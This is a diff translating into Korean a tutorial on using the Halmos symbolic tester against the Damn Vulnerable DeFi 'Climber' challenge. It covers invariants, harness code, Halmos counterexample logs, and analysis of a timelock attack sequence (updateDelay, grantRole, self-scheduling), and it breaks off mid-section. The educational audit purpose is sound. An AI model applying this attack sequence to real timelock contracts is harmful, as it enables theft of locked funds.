@@ -1,8 +1,10 @@
 # Halmos vs Climber
-## Halmos version
-halmos 0.2.4 was used in this article.
-## Foreword
-It is strongly assumed that the reader is familiar with the previous articles on solving 
+
+## Halmos 버전
+이 글에서는 halmos 0.2.4가 사용되었습니다.
+
+## 서문
+독자는 다음 문제를 해결하는 이전 글들에 익숙하다고 강력하게 가정합니다:
 1. [Unstoppable](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) 
 2. [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster)
 3. [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver)
@@ -11,12 +13,13 @@ It is strongly assumed that the reader is familiar with the previous articles on
 6. [Selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie)
 7. [Backdoor](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/backdoor)
 
-since the main ideas here are largely repeated and we will not dwell on them again.
-## Preparation
-### Common prerequisites
-1. Copy **Climber.t.sol** file to **ClimberHalmos.t.sol**.
-2. Rename `test_climber()` to `check_climber()`, so Halmos will execute this test symbolically.
-3. Avoid using `makeAddr()` cheatcode:
+주요 아이디어들이 여기서 대부분 반복되므로 다시 다루지 않을 것입니다.
+
+## 준비
+### 공통 필수 조건
+1. **Climber.t.sol** 파일을 **ClimberHalmos.t.sol**로 복사합니다.
+2. `test_climber()`의 이름을 `check_climber()`로 변경하여 Halmos가 이 테스트를 심볼릭하게 실행하도록 합니다.
+3. `makeAddr()` 치트코드 사용을 피하십시오:
     ```solidity
     address deployer = address(0xcafe0000);
     address player = address(0xcafe0001);
@@ -24,7 +27,7 @@ since the main ideas here are largely repeated and we will not dwell on them aga
     address proposer = address(0xcafe0003);
     address sweeper = address(0xcafe0004);
     ```
-4. Create **GlobalStorage** and save address-name pairs of contracts. Don't forget that in `vault`, the implementation is a separate contract:
+4. **GlobalStorage**를 생성하고 계약의 주소-이름 쌍을 저장합니다. `vault`의 경우, 구현(implementation)이 별도의 계약임을 잊지 마십시오:
     ```solidity
     function get_ERC1967Proxy_implementation(address proxy) public view 
                                             returns (address impl){
@@ -52,7 +55,7 @@ since the main ideas here are largely repeated and we will not dwell on them aga
         ...
     }
     ```
-5. Print all contract addresses:
+5. 모든 계약 주소를 출력합니다:
     ```solidity
     function check_climber() public checkSolvedByPlayer {
         SymbolicAttacker attacker = new SymbolicAttacker();
@@ -75,26 +78,27 @@ since the main ideas here are largely repeated and we will not dwell on them aga
     [console.log] DamnValuableToken  0x00000000000000000000000000000000000000000000000000000000aaaa0006
     [console.log] GlobalStorage      0x00000000000000000000000000000000000000000000000000000000aaaa0007
     ```
-### _isSolved() implementation
-The original checks look like:
+
+### _isSolved() 구현
+원래 확인 로직은 다음과 같습니다:
 ```solidity
 function _isSolved() private view {
     assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
     assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
 }
 ```
-We begin to come up with invariants that could help us achieve some unexpected behavior of target contracts:
-1. The most obvious is checking whether we can somehow reduce the balance of the `vault`:
+우리는 타겟 계약들의 예기치 않은 동작을 달성하는 데 도움이 될 수 있는 불변 조건들을 생각해 내기 시작합니다:
+1. 가장 명백한 것은 `vault`의 잔액을 어떻게든 줄일 수 있는지 확인하는 것입니다:
     ```solidity
     assert (token.balanceOf(address(vault)) >= VAULT_TOKEN_BALANCE);
     ```
-2. A traditional `allowance` check is also here:
+2. 전통적인 `allowance` 확인도 여기에 포함됩니다:
     ```solidity
     // Check allowance changes
     address symbolicSpender = svm.createAddress("symbolicSpender");
     assert (token.allowance(address(vault), symbolicSpender) == 0);
     ```
-3. The `vault` contract has 2 interesting roles: `sweeper` and `owner`. Essentially, these are just variables of type `address` that can change:
+3. `vault` 계약에는 `sweeper`와 `owner`라는 2개의 흥미로운 역할이 있습니다. 본질적으로 이것들은 변경 가능한 `address` 타입의 변수일 뿐입니다:
     ```solidity
     address private _sweeper;
 
@@ -128,18 +132,18 @@ We begin to come up with invariants that could help us achieve some unexpected b
         }
     }
     ```
-    Let's see if we can change this somehow:
+    이것을 어떻게든 변경할 수 있는지 확인해 봅시다:
     ```solidity
     // Check vault roles immutability:
     assert(vault.getSweeper() == sweeper);
     assert(vault.owner() == address(timelock));
     ```
-5. Since the `vault` from the setup is essentially a **UUPS** proxy contract, we can check whether the very **implementation** of this proxy cannot be manipulated in any way:
+5. 설정의 `vault`는 본질적으로 **UUPS** 프록시 계약이므로, 이 프록시의 **구현(implementation)** 자체를 어떤 방식으로든 조작할 수 없는지 확인할 수 있습니다:
     ```solidity
     // Check vault implementation immutability
     assert(glob.get_ERC1967Proxy_implementation(address(vault)) == address(0xaaaa0003));
     ```
-6. `timelock` also has a role system, but it is slightly different from `vault`. The main difference is that multiple addresses can have the same role:
+6. `timelock` 또한 역할 시스템을 가지고 있지만 `vault`와는 약간 다릅니다. 주요 차이점은 여러 주소가 동일한 역할을 가질 수 있다는 것입니다:
    ```solidity
    import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
    
@@ -164,9 +168,9 @@ We begin to come up with invariants that could help us achieve some unexpected b
    ...
    }
    ```
-   We are interested in the `PROPOSER` and `ADMIN` roles.
+   우리는 `PROPOSER`와 `ADMIN` 역할에 관심이 있습니다.
 
-   So, let's see if we can give someone a new role who didn't have one before in `timelock`:
+   따라서, 이전에 `timelock`에서 역할을 갖지 않았던 누군가에게 새로운 역할을 부여할 수 있는지 확인해 봅시다:
     ```solidity
     // Check timelock roles immutability
     address symbolicProposer = svm.createAddress("symbolicProposer");
@@ -178,11 +182,12 @@ We begin to come up with invariants that could help us achieve some unexpected b
     vm.assume(symbolicAdmin != address(timelock));
     assert(!timelock.hasRole(ADMIN_ROLE, symbolicAdmin));
     ```
-## Improvement of coverage
-### SymbolicAttacker callback handling
-Up to this point, we have not considered scenarios where some target contract makes a symbolic `call` back to **SymbolicAttacker** by default. But on the example of the [side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/side-entrance/README.md#callbacks), [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/selfie/README.md#onflashloan) and [backdoor](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/backdoor/README.md#delegatecall) challenges, we can say that this is a fairly common scenario when control is passed back to the contract controlled by the attacker.
 
-Therefore, we will now add a special `fallback()` to **SymbolicAttacker**, which will be able to handle calls from other contracts:
+## 커버리지 개선
+### SymbolicAttacker 콜백 처리
+지금까지 우리는 타겟 계약이 **SymbolicAttacker**에게 심볼릭 `call`을 다시 하는 시나리오를 기본적으로 고려하지 않았습니다. 하지만 [side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/side-entrance/README.md#callbacks), [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/selfie/README.md#onflashloan) 및 [backdoor](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/backdoor/README.md#delegatecall) 챌린지의 예에서 알 수 있듯이, 이것은 공격자가 제어하는 계약으로 제어권이 다시 넘어가는 꽤 일반적인 시나리오입니다.
+
+따라서 이제 **SymbolicAttacker**에 특별한 `fallback()`을 추가하여 다른 계약으로부터의 호출을 처리할 수 있도록 하겠습니다:
 ```solidity
 bool reent_guard = false;
 
@@ -200,7 +205,7 @@ fallback() external payable {
     }
 }
 ```
-Now let's add functionality to **GlobalStorage** to allow other contracts to call this `fallback()`:
+이제 다른 계약들이 이 `fallback()`을 호출할 수 있도록 **GlobalStorage**에 기능을 추가해 봅시다:
 ```solidity
 //SymbolicAttacker address
 address attacker;
@@ -225,7 +230,7 @@ function get_concrete_from_symbolic_optimized (address /*symbolic*/ addr) public
     _vm.assume(false); // Ignore cases when addr is not some concrete known address
 }
 ```
-So, `check_climber()`:
+그래서, `check_climber()`:
 ```solidity
 function check_climber() public checkSolvedByPlayer {
     SymbolicAttacker attacker = new SymbolicAttacker();
@@ -233,8 +238,9 @@ function check_climber() public checkSolvedByPlayer {
     ...
 }
 ```
-### Handling proxy implementation
-Let's take a closer look at something new. In this challenge, we see for the first time upgradable contracts implemented through **ERC1967Proxy**:
+
+### 프록시 구현 처리
+새로운 것을 좀 더 자세히 살펴봅시다. 이 챌린지에서 우리는 **ERC1967Proxy**를 통해 구현된 업그레이드 가능한 계약을 처음으로 봅니다:
 ```solidity
 // Deploy the vault behind a proxy,
 // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
@@ -247,17 +253,17 @@ vault = ClimberVault(
     )
 );
 ```
-Thus, we have a contract that implements 2 interfaces at once: the **ERC1967Proxy** itself and its **implementation** contract interface. Let me remind you that we store only one interface name for each address in **GlobalStorage**, so currently we do not have a mechanism to symbolically execute functions of both interfaces for such proxy.
+따라서 우리는 2개의 인터페이스를 동시에 구현하는 계약을 가지고 있습니다: **ERC1967Proxy** 자체와 그 **구현(implementation)** 계약 인터페이스입니다. 상기시켜 드리자면, 우리는 **GlobalStorage**에 각 주소에 대해 하나의 인터페이스 이름만 저장하므로, 현재로서는 이러한 프록시에 대해 두 인터페이스의 함수를 모두 심볼릭하게 실행할 메커니즘이 없습니다.
 
-One elegant idea is to create a single **SuperInterface** that will be inherited from both interfaces. And we will pass the "**SuperInterface**" as a contract name to **GlobalStorage**:
+한 가지 우아한 아이디어는 두 인터페이스를 모두 상속하는 단일 **SuperInterface**를 만드는 것입니다. 그리고 "**SuperInterface**"를 계약 이름으로 **GlobalStorage**에 전달합니다:
 ```solidity
 interface SuperInterface is ERC1967Proxy, ClimberVault {}
 ...
 glob.add_addr_name_pair(address(vault), "SuperInterface");
 ```
-However, there is a problem with this approach: upgradable contracts can change their **implementation**, so after a potential change of **implementation** contract, such a **SuperInterface** will no longer be relevant for this proxy.
+그러나 이 접근 방식에는 문제가 있습니다. 업그레이드 가능한 계약은 **구현**을 변경할 수 있으므로, 잠재적인 **구현** 계약 변경 후에는 그러한 **SuperInterface**가 이 프록시에 대해 더 이상 유효하지 않게 됩니다.
 
-So, we will have a somewhat more complicated, but more universal solution to this problem:
+따라서, 우리는 이 문제에 대해 다소 복잡하지만 더 보편적인 해결책을 가질 것입니다:
 ```solidity
 function get_addr_data_selector(address /*symbolic*/ addr) private view
 {
@@ -282,7 +288,7 @@ function get_addr_data_selector(address /*symbolic*/ addr) private view
     ...
 }
 ```
-Now the full functionality of the symbolic transaction brute forcing:
+이제 심볼릭 트랜잭션 무차별 대입의 전체 기능입니다:
 ```solidity
 /*
 ** if addr is a concrete value, this returns (addr, symbolic calldata for addr)
@@ -301,8 +307,8 @@ Now the full functionality of the symbolic transaction brute forcing:
                 string memory name = names_by_addr[addresses[i]];
                 ret = addresses[i];
                 /*
-                * Using the symbolic boolean variable "is_implementation" forces Halmos to separately consider
-                * 2 cases: where the interface of the proxy itself or its implementation is used.
+                * "is_implementation"이라는 심볼릭 불리언 변수를 사용하여 Halmos가 프록시 자체의 인터페이스가 사용되는 경우와
+                * 구현의 인터페이스가 사용되는 경우의 2가지 사례를 별도로 고려하도록 강제합니다.
                 */
                 if (keccak256(bytes(name)) == keccak256(bytes("ERC1967Proxy"))) {
                     bool is_implementation = _svm.createBool("is_implementation");
@@ -353,8 +359,9 @@ Now the full functionality of the symbolic transaction brute forcing:
         used_selectors_size++;
     }
 ```
-### Symbolic offsets
-Let's take a look at these two functions from **ClimberTimelock**:
+
+### 심볼릭 오프셋
+**ClimberTimelock**의 다음 두 함수를 살펴봅시다:
 ```solidity
 function schedule(
     address[] calldata targets,
@@ -378,9 +385,9 @@ function execute(
 ...
 }
 ```
-We immediately notice the use of `bytes[] calldata dataElements` as a passed argument. This is already a "classic" pattern that leads to a symbolic offset error. Therefore, as always, we create symbolic bytes ourselves internally, replacing the use of the original bytes with the ones we created.
+우리는 전달된 인수로 `bytes[] calldata dataElements`가 사용되는 것을 즉시 알아차립니다. 이것은 이미 심볼릭 오프셋 오류로 이어지는 "고전적인" 패턴입니다. 따라서 언제나 그렇듯이, 우리는 내부적으로 심볼릭 바이트를 직접 생성하고 원래 바이트 사용을 우리가 생성한 것으로 대체합니다.
 
-But before we move directly to these replacements, it's worth talking about the local `operation` registration system. We have already encountered the functionality of scheduled `actions` in [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#executeaction). There, each `action` was given a number in order. However, "Climber" uses a different system: we are expected to first pass arrays of `targets`, `values`, `bytes`, and `salt` to `schedule()`. All this stuff is concatenated and hashed:
+하지만 이러한 대체로 넘어가기 전에, 로컬 `operation` 등록 시스템에 대해 이야기할 가치가 있습니다. 우리는 이미 [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#executeaction)에서 스케줄된 `actions` 기능을 접했습니다. 거기서는 각 `action`에 순서대로 번호가 부여되었습니다. 하지만 "Climber"는 다른 시스템을 사용합니다: 우리는 먼저 `schedule()`에 `targets`, `values`, `bytes`, `salt`의 배열을 전달해야 합니다. 이 모든 것이 연결되고 해시됩니다:
 ```solidity
 function getOperationId(
     address[] calldata targets,
@@ -391,14 +398,14 @@ function getOperationId(
     return keccak256(abi.encode(targets, values, dataElements, salt));
 }
 ```
-This hash is the `id` of this newly registered action:
+이 해시는 새로 등록된 작업의 `id`입니다:
 ```solidity
 bytes32 id = getOperationId(targets, values, dataElements, salt);
 ...
 operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
 operations[id].known = true;
 ```
-Then, when we want to execute this `action`, we have to pass exactly the same parameters to `execute()`, **byte by byte** (this is important), as in `schedule()`, because here the hash will be taken again, the `id` will be calculated, and based on this it will be clear whether this action was registered at all:
+그런 다음, 이 `action`을 실행하려면, `schedule()`에서와 똑같은 매개변수를 `execute()`에 **바이트 단위로** 전달해야 합니다(이것이 중요합니다). 왜냐하면 여기서 해시가 다시 취해지고 `id`가 계산되며, 이를 기반으로 이 작업이 등록되었는지 여부가 명확해지기 때문입니다:
 ```solidity
 function getOperationState(bytes32 id) public view returns (OperationState state) {
     Operation memory op = operations[id];
@@ -423,22 +430,23 @@ if (getOperationState(id) != OperationState.ReadyForExecution) {
     revert NotReadyForExecution(id);
 }
 ```
-Even if we find a way to somehow register the `operation` (reminding: `attacker` is neither an `admin` nor a `proposer`) - we still need to fulfill two conditions to properly prepare the test for symbolic execution:
-1. Bypass symbolic offset error in `execute()`. The "antidote" to it is to use the `createCalldata()` cheatcode to replace `dataElements[]`. 
-2. `dataElements[]` bytes in the `schedule()` should be replaced not via `createCalldata()`, but via `createBytes()` cheatcode. The thing is, this seems more correct: we can really pass literally any bytes here. This is especially true in setups with upgradable proxy (nothing prevents us from creating an `operation` for proxy, which is not supported by the current **implementation** yet, but maybe someday it will be). And using `createCalldata()` imposes restrictions on what these bytes can be. Although I admit that this take can be debatable.
+우리가 어떻게든 `operation`을 등록할 방법을 찾는다고 해도(상기시키자면: `attacker`는 `admin`도 `proposer`도 아닙니다), 심볼릭 실행을 위한 테스트를 적절하게 준비하기 위해 여전히 두 가지 조건을 충족해야 합니다:
+1. `execute()`에서 심볼릭 오프셋 오류를 우회합니다. 이에 대한 "해독제"는 `createCalldata()` 치트코드를 사용하여 `dataElements[]`를 대체하는 것입니다.
+2. `schedule()`의 `dataElements[]` 바이트는 `createCalldata()`가 아닌 `createBytes()` 치트코드를 통해 대체되어야 합니다. 이것이 더 정확해 보이기 때문입니다: 우리는 여기에 말 그대로 어떤 바이트든 전달할 수 있습니다. 이것은 특히 업그레이드 가능한 프록시가 있는 설정에서 사실입니다(현재 **구현**에서 아직 지원되지 않지만 언젠가 지원될 프록시에 대한 `operation`을 생성하는 것을 막는 것은 없습니다). 그리고 `createCalldata()`를 사용하면 이러한 바이트가 될 수 있는 것에 제한을 둡니다. 물론 이 의견은 논쟁의 여지가 있을 수 있습니다.
 
-Such a mismatch in different cheatcodes in `schedule()` and `execute()` can badly affect the logic of finding the `id`. The fact is that the bytes generated by `createCalldata()` can be of completely different lengths, while `createBytes()` requires us to clearly specify the number of generated symbolic bytes ("extra" bytes will be replaced with `0s` as padding).
+`schedule()`과 `execute()`에서 서로 다른 치트코드를 사용하면 `id`를 찾는 로직에 나쁜 영향을 미칠 수 있습니다. 사실 `createCalldata()`에 의해 생성된 바이트는 완전히 다른 길이가 될 수 있는 반면, `createBytes()`는 생성된 심볼릭 바이트의 수를 명확하게 지정해야 합니다("초과" 바이트는 패딩으로 `0s`로 대체됨).
 
-Now let's remember that we need to preserve the identity of the parameters of both functions to correctly schedule and execute the `operation`. Thus, we will not be able to simply prove that the `operation` we passed to `execute()` was scheduled. We are faced with an unusual problem that needs to be solved.
-### Simplified validation
-Here are some ideas on how we can solve this:
-1. Somehow modify symbolic bytes from `createCalldata()` so that they are also of static size and output `0s` at the end as padding (more on that a little later).
-2. Handle separately situations with potential proxy **implementation** change.
-3. Refactor the `operations` functionality itself to make it more "friendly" for symbolic analysis (Say "hello" to symbolic mapping keys from [backdoor](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/backdoor#ownerisnotabeneficiary-issue)).
+이제 `operation`을 올바르게 스케줄하고 실행하려면 두 함수의 매개변수의 동일성을 보존해야 한다는 것을 기억해 봅시다. 따라서 우리는 `execute()`에 전달한 `operation`이 스케줄되었다는 것을 단순히 증명할 수 없을 것입니다. 우리는 해결해야 할 특이한 문제에 직면했습니다.
 
-All of them have the right to exist and can potentially be used to solve this problem. However, it is easier to slightly change the principle by which `id` is calculated: instead of concatenating the entire array of bytes, we can try to concatenate only the function selector from each byte array. This selector is always of static size, `4` bytes, which will allow us to check at `execute()` whether such a set of addresses and corresponding functions has been registered (without specific parameters for these functions). Of course, we take into account that any simplification of verification may lead to false counterexamples. But, in my opinion, this should be a profitable trade-off.
+### 단순화된 검증
+다음은 이 문제를 해결할 수 있는 몇 가지 아이디어입니다:
+1. `createCalldata()`의 심볼릭 바이트를 수정하여 정적 크기를 가지고 끝에 패딩으로 `0s`를 출력하도록 합니다(이에 대해서는 나중에 자세히 설명).
+2. 잠재적인 프록시 **구현** 변경 상황을 별도로 처리합니다.
+3. `operations` 기능 자체를 리팩토링하여 심볼릭 분석에 더 "친화적"으로 만듭니다([backdoor](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/backdoor#ownerisnotabeneficiary-issue)의 심볼릭 매핑 키에 "안녕"하세요).
 
-That's all, we've discussed the necessary topics. Let's implement it:
+이들 모두 존재할 권리가 있으며 잠재적으로 이 문제를 해결하는 데 사용될 수 있습니다. 그러나 `id` 계산 원리를 약간 변경하는 것이 더 쉽습니다: 전체 바이트 배열을 연결하는 대신 각 바이트 배열의 함수 선택자(selector)만 연결해 볼 수 있습니다. 이 선택자는 항상 `4` 바이트의 정적 크기이므로, `execute()`에서 그러한 주소 집합과 해당 함수가 등록되었는지 확인할 수 있습니다(이러한 함수에 대한 특정 매개변수 없이). 물론 우리는 검증의 단순화가 잘못된 반례로 이어질 수 있다는 점을 고려합니다. 하지만 제 생각에 이것은 수익성 있는 절충안이 될 것입니다.
+
+그게 다입니다. 필요한 주제를 논의했습니다. 구현해 봅시다:
 ```solidity
 abstract contract ClimberTimelockBase is AccessControl {
 ...
@@ -541,10 +549,10 @@ function execute(address[] calldata targets, uint256[] calldata values, bytes[] 
     operations[id].executed = true;
 }
 ```
-### Padding for `createCalldata()` bytes
-This subsection was written after reviewing the entire article. [karmacoma](https://github.com/0xkarmacoma) suggested that adding padding to the bytes created via `createCalldata()` is not such a complicated way to get around the problem. In fact, we just need to choose a sufficiently large bytes array size that will be used in both `execute()` and `schedule()` (I chose `2048`). 
+### `createCalldata()` 바이트를 위한 패딩
+이 하위 섹션은 전체 기사를 검토한 후 작성되었습니다. [karmacoma](https://github.com/0xkarmacoma)는 `createCalldata()`를 통해 생성된 바이트에 패딩을 추가하는 것이 문제를 우회하는 그렇게 복잡한 방법이 아니라고 제안했습니다. 사실, 우리는 `execute()`와 `schedule()` 모두에서 사용될 충분히 큰 바이트 배열 크기만 선택하면 됩니다(저는 `2048`을 선택했습니다).
 
-In `schedule()` we will use `createBytes()` to replace `dataElements`:
+`schedule()`에서는 `dataElements`를 대체하기 위해 `createBytes()`를 사용할 것입니다:
 ```solidity
 function schedule(
 ...
@@ -564,7 +572,7 @@ function schedule(
     ...
 }
 ```
-In `execute()`, we dynamically calculate the `padding` size and concatenate it with the result we took from `createCalldata()`:
+`execute()`에서는 동적으로 `padding` 크기를 계산하고 `createCalldata()`에서 가져온 결과와 연결합니다:
 ```solidity
 function execute(
 ...
@@ -587,11 +595,12 @@ function execute(
     ...
 }
 ```
-So, now we will consider two approaches in parallel: through a simplified `id` and through `padding`. Then we will compare the results.
-## Expanding the number of symbolic transactions
-### Places to expand
-In the setup with one symbolic attacking transaction, Halmos did not find any counterexamples. Therefore, we do the usual expansion of the number of symbolic attacking transactions. As we know from [Selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#expand-onflashloan), `SymbolicAttacker::attack()` is not the only place where you can expand the number of symbolic transactions. In the current setup, there are at least 3 of them:
-1. Actually, `SymbolicAttacker::attack()`:
+이제 단순화된 `id`를 통한 접근 방식과 `padding`을 통한 접근 방식 두 가지를 병렬로 고려할 것입니다. 그런 다음 결과를 비교할 것입니다.
+
+## 심볼릭 트랜잭션 수 확장
+### 확장할 곳
+하나의 심볼릭 공격 트랜잭션이 있는 설정에서는 Halmos가 반례를 찾지 못했습니다. 따라서 우리는 심볼릭 공격 트랜잭션의 수를 늘리는 일반적인 확장을 수행합니다. [Selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#expand-onflashloan)에서 알 수 있듯이, `SymbolicAttacker::attack()`만이 심볼릭 트랜잭션의 수를 확장할 수 있는 유일한 곳은 아닙니다. 현재 설정에는 확장이 가능한 곳이 적어도 3곳 있습니다:
+1. 실제로 `SymbolicAttacker::attack()`:
     ```solidity
     function attack() public {
         vm.assume(msg.sender == address(0xcafe0001)); // Only player can execute it
@@ -606,16 +615,16 @@ In the setup with one symbolic attacking transaction, Halmos did not find any co
         ...
     }
     ```
-3. Increase the number of transactions passed to `ClimberTimelock::execute()`:
+3. `ClimberTimelock::execute()`에 전달되는 트랜잭션 수 증가:
     ```solidity
     function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
         external
         payable
     {
     ```
-    We can do this by passing the `--default-array-lengths 3` parameter to Halmos (default value is `0, 1, 2`)
+    Halmos에 `--default-array-lengths 3` 매개변수를 전달하여 이를 수행할 수 있습니다(기본값은 `0, 1, 2`).
 
-We have no choice but to try each of these methods one by one:
+우리는 이 방법들을 하나씩 시도해 볼 수밖에 없습니다:
 
 1. 
     ```solidity
@@ -625,8 +634,8 @@ We have no choice but to try each of these methods one by one:
         execute_tx("attack_target2");
     }
     ```
-    Adding one transaction to `attack()` did nothing: no counterexample found yet.
-2. The same situation with the `fallback()` extension:
+    `attack()`에 하나의 트랜잭션을 추가해도 아무런 효과가 없었습니다: 아직 반례가 발견되지 않았습니다.
+2. `fallback()` 확장의 경우도 마찬가지입니다:
     ```solidity
     fallback() external payable {
         ...
@@ -635,7 +644,7 @@ We have no choice but to try each of these methods one by one:
         ...
     }
     ```
-3. But increasing the functions number in `execute()` gave a very interesting result. First, the results for the simplified `id` approach:
+3. 하지만 `execute()`의 함수 수를 늘리면 매우 흥미로운 결과가 나왔습니다. 먼저 단순화된 `id` 접근 방식의 결과입니다:
     ```javascript
     halmos --solver-timeout-assertion 0 --function check_climber --loop 100  --default-array-lengths 3 --solver-timeout-branching 0
     ...
@@ -677,7 +686,7 @@ We have no choice but to try each of these methods one by one:
         p_values_length_627b85a_166 = 0x0000000000000000000000000000000000000000000000000000000000000003
         p_values_length_fb84b24_09 = 0x0000000000000000000000000000000000000000000000000000000000000003
     ```
-    And the second counterexample:
+    그리고 두 번째 반례입니다:
     ```javascript
     Counterexample:
         halmos_attack_target_address_2b26674_01 = 0x00000000000000000000000000000000aaaa0005
@@ -721,9 +730,9 @@ We have no choice but to try each of these methods one by one:
         p_values_length_3bb651e_171 = 0x0000000000000000000000000000000000000000000000000000000000000003
         p_values_length_fb84b24_09 = 0x0000000000000000000000000000000000000000000000000000000000000003
     ```
-    After 12 hours of execution, this test was still not finished, but these counterexamples appeared in the logs.
+    12시간 동안 실행한 후에도 이 테스트는 끝나지 않았지만 로그에는 이러한 반례들이 나타났습니다.
 
-    Now the results for `padding` approach:
+    이제 `padding` 접근 방식의 결과입니다:
     ```javascript
     Counterexample:
         halmos_attack_target_address_86f6449_01 = 0x00000000000000000000000000000000aaaa0005
@@ -764,8 +773,9 @@ We have no choice but to try each of these methods one by one:
         p_values_length_90beef3_09 = 0x0000000000000000000000000000000000000000000000000000000000000003
         p_values_length_dc7b73d_280 = 0x0000000000000000000000000000000000000000000000000000000000000003
     ```
-### Counterexamples analysis
-Let's start with the first one. We are interested in these few lines:
+
+### 반례 분석
+첫 번째 것부터 시작해 봅시다. 다음 몇 줄에 관심이 있습니다:
 ```javascript
 halmos_execute_selector_bytes4_10ce5fe_134 = updateDelay
 halmos_execute_selector_bytes4_1645f73_89 = grantRole
@@ -781,14 +791,14 @@ halmos_schedule_target_address_01c0fa0_184 = 0x00000000000000000000000000000000a
 halmos_schedule_target_address_7f47fc1_187 = 0x00000000000000000000000000000000aaaa0005
 halmos_schedule_target_address_be00243_181 = 0x00000000000000000000000000000000aaaa0005
 ```
-Halmos saw an interesting scenario: Anyone can invoke the following sequence of functions as an `operation`:
-1. Disable `delay` by calling `ClimberTimelock::updateDelay()`
-2. Grant `PROPOSER_ROLE` role for the `timelock` itself.
-3. Call `schedule()` to register the transaction itself during its execution.
+Halmos는 흥미로운 시나리오를 보았습니다: 누구나 `operation`으로 다음 함수 시퀀스를 호출할 수 있습니다:
+1. `ClimberTimelock::updateDelay()`를 호출하여 `delay`를 비활성화합니다.
+2. `timelock` 자체에 `PROPOSER_ROLE` 역할을 부여합니다.
+3. 실행 중에 트랜잭션 자체를 등록하기 위해 `schedule()`을 호출합니다.
 
-Thus, we broke the invariant about the immutability of `PROPOSER_ROLE` in `ClimberTimelock`.
+따라서 우리는 `ClimberTimelock`의 `PROPOSER_ROLE`의 불변성에 대한 불변 조건을 깨뜨렸습니다.
 
-What does this mean? If we have such a mechanism to manage the `ClimberTimelock` contract by `attacker`, then will we also find a full attack easily? Not so fast! Unfortunately, this is a fake counterexample for now. Remember, we simplified the `id` storage formula a bit? Let's try to apply this found counterexample in the original `id` calculation mechanism. Let's return the full set of bytes to the concatenation and try to find a transaction that registers itself according to the scenario described above:
+이것이 무엇을 의미할까요? 만약 우리가 `attacker`에 의해 `ClimberTimelock` 계약을 관리할 수 있는 메커니즘을 가지고 있다면, 우리는 전체 공격을 쉽게 찾을 수 있을까요? 그렇게 빠르진 않습니다! 불행히도 이것은 현재로서는 가짜 반례입니다. 기억하시나요, 우리가 `id` 저장 공식을 약간 단순화했다는 것을? 이 발견된 반례를 원래 `id` 계산 메커니즘에 적용해 봅시다. 전체 바이트 세트를 연결로 되돌리고 위에 설명된 시나리오에 따라 자체적으로 등록하는 트랜잭션을 찾아봅시다:
 ```solidity
 function getOperationId(
     address[] memory targets,
@@ -799,9 +809,10 @@ function getOperationId(
     return keccak256(abi.encode(targets, values, dataElements, salt));
 }
 ```
-And... We simply cannot cope with this task. To explain this, we'll need to use a bit of mathematical language. For simplicity, let's say `abi.encode(targets, values, dataElements, salt)` is `A`. So, `A` is the bytes array that encodes all the parameters passed to `execute()`. The last parameter in `dataElements[]` array, in order to schedule such `operation`, should be the same set of parameters, passed to `execute()` aka `A` again. In other words, `A` must be a part of `A` in this scenario. I don't think it's necessary to explain that this is impossible if `A` also has to contain encoded `updateDelay()` and `grantRole()`.
+```
+그리고... 우리는 단순히 이 작업에 대처할 수 없습니다. 이것을 설명하기 위해 약간의 수학적 언어를 사용해야 합니다. 간단히 말해 `abi.encode(targets, values, dataElements, salt)`를 `A`라고 합시다. 따라서 `A`는 `execute()`에 전달된 모든 매개변수를 인코딩하는 바이트 배열입니다. 그러한 `operation`을 스케줄하기 위해 `dataElements[]` 배열의 마지막 매개변수는 `execute()`에 전달된 것과 동일한 매개변수 집합, 즉 다시 `A`여야 합니다. 즉, 이 시나리오에서 `A`는 `A`의 일부여야 합니다. `A`가 인코딩된 `updateDelay()`와 `grantRole()`도 포함해야 하는 경우 이것이 불가능하다는 것을 설명할 필요는 없다고 생각합니다.
 
-So, to summarize: We encountered somewhat contradictory results. On the one hand, our simplification of the `id` calculation led to a fake counterexample. But on the other hand, an experienced auditor would notice a violation of an important [principle](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) of writing secure contracts even from such a result: first we validate the passed parameters, then we execute them:
+요약하자면: 우리는 다소 모순된 결과에 직면했습니다. 한편으로는 `id` 계산의 단순화가 가짜 반례로 이어졌습니다. 하지만 다른 한편으로는, 경험 많은 감사자는 그러한 결과에서도 안전한 계약 작성의 중요한 [원칙](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) 위반을 알아차릴 것입니다: 먼저 전달된 매개변수를 검증한 다음 실행합니다:
 ```solidity
 bytes32 id = getOperationId(_targets, _values, _dataElementsSelectors, _salt);
 
@@ -814,9 +825,9 @@ if (getOperationState(id) != OperationState.ReadyForExecution) {
     revert NotReadyForExecution(id);
 }
 ```
-Therefore, even based on this fake counterexample, a real attack can be found in practice.
+따라서 이 가짜 반례를 기반으로도 실제 공격을 실제로 찾을 수 있습니다.
 
-However, we can relax, since all these problems will be solved when we consider the second counterexample. We are interested in these lines:
